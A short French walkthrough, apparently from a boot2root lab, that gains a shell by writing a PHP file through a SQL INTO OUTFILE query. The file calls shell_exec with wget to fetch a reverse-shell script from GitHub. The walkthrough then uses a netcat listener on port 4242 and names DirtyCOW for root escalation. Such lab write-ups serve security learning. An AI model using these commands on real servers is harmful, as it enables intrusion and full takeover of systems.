En suivant le même chemin pour arriver à avoir un accès root sur la db, on peut réussir à uploader n'importe quel fichier sur le serveur avec une requete SQL et lui faire éxécuter.
On trouve donc ce fichier (à modifier) qui nous permet d'avoir un shell sur la machine.
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

On remplace l'IP par l'ip de notre hôte et le port par le port 4242.
```
select “<?php $output = shell_exec(‘wget https://raw.githubusercontent.com/mmartins1502/boot2root/master/scripts/reverse_shell.php ’); echo $output ?>” into outfile “/var/www/forum/templates_c/dl.php”
```
Avec "nc -v -n -l 4242" on attend une connection. 
On lance le script qui etablit la connexion, on a donc un shell connecté en remote ou on est connecté sur l'user www-data.
Enfin, on peut réutiliser l'exploit DirtyCOW pour créer un user root à partir d'ici.
Tadam!
